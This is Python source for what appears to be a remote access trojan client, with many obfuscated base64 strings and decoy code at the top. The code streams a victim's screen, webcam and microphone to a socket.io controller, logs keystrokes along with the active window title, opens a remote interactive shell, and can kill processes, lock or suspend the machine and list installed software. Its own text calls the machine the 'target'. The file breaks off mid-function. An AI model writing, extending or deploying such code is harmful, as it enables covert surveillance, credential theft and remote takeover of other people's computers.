if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
_s554 = "EmFmfWJNYXFgd3d8TXFzYmZnYHc="
_s555 = "EmFxYHd3fE1xc2JmZ2B3TWFmc2ZnYQ=="
_s556 = "ne746cLu/u/4+PPC8PLz9Ony7w=="
_s557 = "pcjKy8zRytc="
_s558 = "hOnr6u3w6/Y="
_s559 = "WCs7Kj09Ngc7OSgsLSo9ByssOSwtKw=="
_s560 = "Pk1bSmFNXUxbW1BhT0tfUldKRw=="
_s561 = "zL25raCluLU="
_s562 = "JFdHRUhB"
_s563 = "yLu8qbq8l7+tqquppQ=="
_s564 = "yr2vqKmrp5W5vqu+v7k="
_s565 = "2aqttqmGrry7uri0"
_s566 = "LllLTE1PQ3FdWk9aW10="
_s567 = "Wyg+LwQsPjk4OjYEKi46NzIvIg=="
_s568 = "+4qOmpeSj4I="
_s569 = "O1ZSWGRIT1pJTw=="
_s570 = "qMXBy/fb3MfY"
_s571 = "9puflamFgpeCg4U="
_s572 = "QCslOSwvJx8zNCEyNA=="
_s573 = "h+zi/uvo4Nj08+j3"
_s574 = "NVhaQEZQalBDUFtB"
_s575 = "yLixpri9vA=="
_s576 = "psfF0s/JyA=="
_s577 = "D2JgeWo="
_s578 = "xaiqs6Cat6CppLGss6A="
_s579 = "i+jn4ujg"
_s580 = "rsLLyNo="
_s581 = "hObx8PDr6g=="
_s582 = "STk7LDo6"
_s583 = "bB4JAAkNHwk="
_s584 = "0KOzor+8vA=="
_s585 = "nfb45P/y/O/5wvjr+PPp"
_s586 = "ivrz5Pr//g=="
_s587 = "lfbh5/k="
_s588 = "rsvA2svc"
_s589 = "VDAxODEgMQ=="
_s590 = "7oqBmYA="
_s591 = "9ZSWgZyamw=="
_s592 = "t8fF0sTE"
_s593 = "KVtMRUxIWkw="
_s594 = "je7i4O/i"
_s595 = "oMvF2dM="
_s596 = "p9Pe18I="
_s597 = "EWJ5fmNlcmRl"
_s598 = "07Cnob+Msr+njLe2vw=="
_s599 = "/ZyRiaKJnJ8="
_s600 = "BnFvaFli"
_s601 = "+4ySlaSe"
_s602 = "cRIFAx0uEg=="
_s603 = "QCM0MiwfOA=="
_s604 = "G3hvaXdEeg=="
_s605 = "UjwzPzc="
_s606 = "BXFgd2hsa2RpWnZxZHdx"
_s607 = "dQEQBxgcGxQZKgYBFAEABg=="
_s608 = "xbGgt6isq6SpmqyrtbCx"
_s609 = "44CMjo6CjYc="
_s610 = "u8/eydbS1drX5MjP1Ms="
_s611 = "F2NyZXp+eXZ7SGRjdmNiZA=="
_s612 = "O0hPWklPZEhCSE9eVmRWVFVST1RJ"
_s613 = "0by+v7ilvqOOoqWwpaSi"
_s614 = "jf754v3S/vT++ejg0uDi4+T54v8="
_s615 = "MVxeX1hFXkNuQkVQRURC"
_s616 = "QiUnNh0yMC0hJzExJzE="
_s617 = "DX1/Ym5ofn5SYWR+eQ=="
_s618 = "uNPR1NTnyMrX293Lyw=="
_s619 = "p9fVyMTC1NT4zM7Ly/jVwtTSy9M="
_s620 = "9JeYnYSWm5WGkKuTkYA="
_s621 = "pNTd1MHWx8jN1A=="
_s622 = "1Le4vaS2u7WmsIuwtaC1"
_s623 = "Ti0iJz4sIS88KhEqLzov"
_s624 = "ZQYJDBUHCgQXAToBBBEE"
_s625 = "FXZ5fGV3enRncUpmcGE="
_s626 = "xLS9tKG2p6ittA=="
_s627 = "ZREAHRE="
_s628 = "54SLjpeFiIaVg7iUk4aTkpQ="
_s629 = "BWZpbHVnamR3YVp2cWRxcHY="
_s630 = "bw4aCwYAMAgKGzAZAAMaAgo="
_s631 = "QyI2JyosHDUsLzYuJg=="
_s632 = "LUxYSURCcl5IWXJbQkFYQEg="
_s633 = "agYPHA8G"
_s634 = "XD0pODUzAygzOzswOQMxKSg5"
_s635 = "5YSQgYyKupOKiZCIgA=="
_s636 = "3a2yqrivgrCys7Spsq+Csru7"
_s637 = "TT0iOig/Ej8oPjghOQ=="
_s638 = "65uEnI6ZtIeEiIA="
_s639 = "wrKttaewnbCnsbeutg=="
_s640 = "u8vUzN7J5MjX3t7L"
_s641 = "dgYZARMEKQQTBQMaAg=="
_s642 = "eQ4YFRUJGAkcCyYKHA0="
_s643 = "bBwNGAQ="
_s644 = "UTwiNjM+KQ4iOT4m"
_s645 = "5pKPkoqD"
_s646 = "VjkmMzgJIyQ6"
_s647 = "psXLwvnUw9XTytI="
_s648 = "cgYTGRctAREAFxccARodBg=="
_s649 = "jP/v/unp4v/k4/jT/un/+eD4"
_s650 = "YAcFFD8HBQ8JEA=="
try:
    raise Exception()
except:
    pass
_s651 = "x6CiqK63mLWitLKrsw=="
_s652 = "WT48LQY4KSkq"
_s653 = "QCEwMDMfMiUzNSw0"
_s654 = "hfXp5Pza9urw6+E="
_s655 = "MVdDVEA="
_s656 = "yLutqbqroJeuoaStuw=="
_s657 = "1Ka7u6A="
_s658 = "VzIvMjQiIzIINDg6OjY5Mw=="
_s659 = "o8DMzs7Czcc="
_s660 = "17O4oLm7uLaziLKvsrQ="
_s661 = "3a28qbU="
_s662 = "v9bRz8rL4N3T0NzU"
_s663 = "QCMtJB8yJTM1LDQ="
_s664 = "D2Zhf3p7UHphbWNgbGQ="
_s665 = "VzQ6MwglMiQiOyM="
_s666 = "5oCPioO5io+Vkg=="
_s667 = "Xjg3MjsBMjctKgEsOy0rMio="
_s668 = "2b+wtbyGvbaut7W2uL2Gq7yorLyqrQ=="
_s669 = "ZAINCAE7AAsTCggLBQA7BwwRCg8="
_s670 = "ZQMMCQA6AQAJABEA"
_s671 = "+oqbjpI="
_s672 = "WjwzNj8FND8tBTw1Nj4/KA=="
_s673 = "7p6PnIuAmg=="
_s674 = "1bO8ubCKoKW5urSxira9oLu+"
_s675 = "xbWksa0="
_s676 = "BmBvamNZc3ZqaWdiWXRjdXNqcg=="
_s677 = "v9Hay8jQzdTg1tHZ0A=="
_s678 = "vtDbysnRzNXh19DY0eHM283L0so="
_s679 = "NFZGW0NHUUZrR0BRVVg="
_s680 = "KWtbRl5aTFsJWl1MSEVMWwlbTFhcTFpdTE0="
_s681 = "iuj45f357/jV+f7v6+bV+O/5/+b+"
_s682 = "w6Cxpqemrbeqoq+cq6Kxtaawtw=="
_s683 = "DE9+aWhpYnhlbWAsZG1+eml/eCx+aX15aX94aWg="
_s684 = "WjkoPz4/NC4zOzYFMjsoLD8pLgUoPykvNi4="
_s685 = "SiMkLC8pPhU5KSsk"
_s686 = "1Zy7s7C2oby6u/WmtrS79aewpKCwpqGwsQ=="
_s687 = "6pmfiISPnpk="
_s688 = "/5aRmZqci6CMnJ6RoI2ajIqTiw=="
_s689 = "QyotJSYgNxwwNyIxNw=="
_s690 = "UCQxIjc1JA=="
_s691 = "bRgeCB8DDAAI"
_s692 = "dgYXBQUBGQQS"
_s693 = "fxIaCxcQGw=="
_s694 = "+5KVnZ6Yj6SJnoiOl48="
_s695 = "iOHm7u3r/Nf87fv81+v67ezt5vzh6eT7"
_s696 = "cAQRAhcVBA=="
_s697 = "y764rrmlqqau"
_s698 = "SzsqODg8JDkv"
_s699 = "KUBHT0xKXXZKW0xNTEddQEhFdltMWlxFXQ=="
_s700 = "i/zi7eLU4uXt7uj/"
_s701 = "rN/fxcg="
_s702 = "kuLz4eHl/eD2"
_s703 = "7JuFioWzhYKKiY+Ys56Jn5mAmA=="
_s704 = "cgUbFBstGxwUFxEGLQAXAQceBg=="
_s705 = "PFVSWllfSGNdSUhTY0hORQ=="
_s706 = "L25aW0ACW11WD0dOXVlKXFtKSw9MXUpLSkFbRk5DXA9OSE5GQVxbD1xMTkEPW05dSEpbXAE="
_s707 = "u/rOz9SWz8nCm9jJ3t/e1c/S2tfIm9TVm9/SyNjUzd7J3t+bz9rJ3N7PyA=="
_s708 = "PEtVUlhTS09jVFNPSE8="
_s709 = "iuPk7O/p/tX56evk1fjv+f/m/g=="
_s710 = "OVBXX1xaTWZKTVhNTEo="
_s711 = "YwoNBQYAFzwCFhcMPBEGEBYPFw=="
_s712 = "+IyZip+djA=="
_s713 = "nfTz+/j+6cLv+O7o8ek="
_s714 = "fxsbEAwgDAseDQs="
_s715 = "s8fSwdTWxw=="
_s716 = "ZxcIFRM="
_s717 = "OU1RS1xYXUo="
_s718 = "t8fW1NzSw+jE3s3S"
_s719 = "cB0VBBgfFA=="
_s720 = "27+/tKiEqK+6r66o"
_s721 = "0bW1vqKOoqW+oQ=="
_s722 = "bAcFAAAzHxsFGA8E"
_s723 = "EVpYXV0xQkZYRVJZ"
_s724 = "0J2lvKS5/aS4orWxtLW08JSUv4PwsaSksbO78LW+t7m+tfCjpaCgv6Kkub638ISTgPzwhZSA/PCYhISA/PCDvL+nvL+iuaP+"
_s725 = "H29+fHR6a2w="
_s726 = "eQkYGhIcDQo="
_s727 = "Xzs7MCwALCs+Kyos"
_s728 = "RCAgKzcbNzAlMDE3"
_s729 = "2p6etYn6qa61qqq/vg=="
_s730 = "rfrC38bI343Zxd/IzMmN2cXM2Y3eyMPJ3o3dzM7GyNnejc7Cw9nEw9jC2N7B1IM="
_s731 = "dR0BAQU="
_s732 = "bx8ODAQKGxw="
_s733 = "nvr/6v/B/Ofq++0="
_s734 = "x7empKyis7Q="
_s735 = "RTUkJi4gMTY="
_s736 = "1LC1oLWLtq2gsac="
_s737 = "pdXExs7A0dY="
_s738 = "TiY6Oj4="
_s739 = "SCA8PDg7"
_s740 = "UCAxMzs1JCM="
_s741 = "GX14bXhGe2BtfGo="
_s742 = "SzsqKCAuPzg="
_s743 = "z7yjoLijoL2mvA=="
_s744 = "06OysLi2p6A="
_s745 = "H096bXZwe3Z8fnNzZj9senF7P2xrfmtsP2twP2t3ej9sem1pem0x"
_s746 = "OUpNWEtNZk1QVFw="
_s747 = "UCAxMzs1JCM="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s748 = "G396b3pEeWJvfmg="
_s749 = "4oaGjZG9kIeRl46W"
_s750 = "u8jP2s/I"
_s751 = "7JyNj4eJmJ8="
_s752 = "qs7L3sv1x8g="
_s753 = "RiMqJzY1IyI="
_s754 = "O2l6aEtTXkleG3hXUl5VTw=="
_s755 = "mbS06vzr7/zr"
_s756 = "rIGB38nP3snY"
_s757 = "2fT0sL0="
_s758 = "HDExbnl/c3JyeX9o"
_s759 = "fVBQFBMOCRwREQ=="
_s760 = "OhcXT1RTVElOW1ZW"
_s761 = "dVhYGxpYBRAHBhwGAQ=="
_s762 = "MRwcVF1UR1BFVFU="
_s763 = "u5aW1dSW3tfezdrP3g=="
_s764 = "rKb3h/GM/Mne38Xf2MnCz8mM3snBw9rJyIKm"
_s765 = "joTVo9OuwOGu/uv8/ef9+uvg7euu6OH74OqghA=="
_s766 = "jsvc3MHctK6jo/3r/Pjr/K7v4Oquo6P96+386/qu/Ov/++f86+qu6OH8rqOj5+D9+u/i4g=="
_s767 = "XFYHdwF8DDkuLzUvKDkyPzl8NTIvKD0wMDk4fXwdKSgzcS8oPS4ofDMyfD4zMyhyVg=="
_s768 = "eHIjVSVYMRYLDBkUFFgeGREUHRxWWCoNFlgZC1gZHBURFlZy"
_s769 = "J1BOSRQV"
_s770 = "4qyNlsKDho+LjMLPwoOWloePkpaLjIXCkYuOh4yWwrejocKAm5KDkZHMzMw="
_s771 = "r/SO8o/67uyPzdbfztzcj8nOxsPKy4+Cj93awcHGwciP2Mbbx4/DxsLG28rLj9/dxtnGw8rIytw="
_s772 = "ejsWCB8bHgNaCA8UFBMUHVobCVobHhcTFA=="
_s773 = "Sy4nLj0qPy4v"
_s774 = "BlRzaGhvaGEmY2pjcGdyY2ImKyZlamNnaG9oYSZzdiZTR0UmZH92Z3V1JnRjYW91cnR/KCgo"
_s775 = "ueKS5Jnp3MvK0MrN3Nfa3JnL3N/L3MrR3N0="
_s776 = "Jn0HewZ2Q1RVT1VSQ0hFQwZLR18GTkdQQwZWR1RST0dKSl8GQEdPSkNCBg5UU0gGR1UGR0JLT0gGQElUBnVFTkNCU0pDQgZyR1VNDw=="
_s777 = "qO36+uf6koj7zdyI9/vt+v7t+ojBxojLx8zNiMfaiN3bzYiFhdvN2t7N2g=="
_s778 = "uv/o6PXogJrp386a5en/+ej/7prT1JrZ1d7fmtXIms/J35qXl8nf2cjfzg=="
_s779 = "jM/j4uLp7/jp6K2s2+3l+OXi66zq4/6s7+Ph4e3i6P+ioqI="
_s780 = "cDUIGQQZHhdQFh8CUAUAFBEEFV5eXg=="
_s781 = "0YK5pKW1vqa/"
_s782 = "VgUiOSYmMzI="
_s783 = "SBcXJSkhJhcX"
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
       _D("_s6"): False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s7")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s8")] = True
except: pass
try: import pyperclip; HAS[_D("_s9")] = True
except: pass
try: import psutil; HAS[_D("_s10")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import pyaudio; HAS[_D("_s11")] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS[_D("_s12")] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s13")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s14"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s15")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
        except: pass
        try:
            if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s18")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s20") and not HAS["mss"]: return
        if self.src == _D("_s21") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s22")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s23"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s24"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s25"))
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s26"), quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s27")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s28"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s29")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s30"): b64, "format": "jpeg"})
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class MicEngine:
    ""_D("_s31")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None
    def start(self):
        if self.r: return
        if not HAS[_D("_s32")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s33"), {"active": False, "error": "pyaudio not installed on target"})
            return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            _l.error(f"Mic init error: {e}"); self.stop()
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s34"), {"active": False, "error": str(e)})
            return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s35"), {"active": True})
    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None
    @staticmethod
    def _make_wav(pcm_data):
        ""_D("_s36")""
        import struct
        data_len = len(pcm_data)
        header = struct.pack(_D("_s37"),
            b_D("_s38"), 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b_D("_s39"), data_len)
        return header + pcm_data
    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s40"), {"audio": b64})
            except Exception as e:
                _l.error(f"Mic err: {e}")
                time.sleep(0.1)
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS[_D("_s41")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s42"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s43"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s44"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s45"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s46"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s47"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s48"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s49")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s50")) else None,
                    env={**os.environ, _D("_s51"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s52"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s53"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s54"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s55"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s56"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s57"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s58")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write(_D("_s59")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: _l.error(f"Term write: {e}")
class Keylog:
    ""_D("_s60")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""
    def start(self):
        if self.r or not HAS[_D("_s61")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s62"), {"active": False, "error": "pynput not available"})
            return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s63"), {"active": True})
    def stop(self):
        self.r = False; self._flush()  
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s64"), {"active": False})
    def _active_window(self):
        try:
            if sys.platform == _D("_s65"):
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""
    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, _D("_s66")) and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass
    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit(_D("_s67"), {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []
    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()
def _proc(): return [{"pid": p.info["pid"], _D("_s68"): p.info["name"] or "?",
    "cpu": p.info[_D("_s69")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s70"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s71")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s72")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s73"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s74")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s75")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s76") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s77"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s78") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s79"):
            subprocess.run([_D("_s80"),"-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [[_D("_s81"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s82") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s83"):
            subprocess.run([_D("_s84"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s85"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s86")""
    is_url = path.startswith(_D("_s87")) or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s88"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s89")
    try:
        if sys.platform == _D("_s90"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s91")
        elif sys.platform == _D("_s92"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s93"), "-e", script], capture_output=True)
            return True, _D("_s94")
        else:
            for cmd in [
                [_D("_s95"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s96"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s97")
                except: continue
            return False, _D("_s98")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s99")""
    try:
        if sys.platform == _D("_s100"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s101"):
            subprocess.run([_D("_s102"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s103"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s104")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s105")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s106")""
    if not HAS["mss"]: return None, _D("_s107")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s108"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s109")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s110"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s111"): str(e)}
def _apps():
    ""_D("_s112")""
    apps = []
    if sys.platform == _D("_s113"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s114"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s115"):
        r = subprocess.run([_D("_s116"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s117"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
